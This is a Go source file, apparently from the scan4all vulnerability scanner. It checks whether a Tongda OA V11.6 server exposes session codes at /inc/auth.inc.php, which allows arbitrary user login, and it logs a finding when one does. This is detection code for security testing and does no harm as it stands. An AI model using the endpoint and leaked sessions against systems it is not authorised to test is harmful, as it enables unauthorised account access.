package tongda

import (
	"github.com/GhostTroops/scan4all/lib/util"
	"regexp"
)

// version Tongda OA V11.6 arbitrary user login
func Get_user_session(url string) bool {

	if req, err := util.HttpRequset(url+"/inc/auth.inc.php", "GET", "", false, nil); err == nil {
		re, _ := regexp.Match("\"code_uid\":\"{.*?}\"", []byte(req.Body))
		if re {
			util.SendLog(req.RequestUrl, "Get_user_session", "Found vuln tongda-OA any_user_Login you can use session to login", "")
			return true
		}

		return false
	}

	return false
}
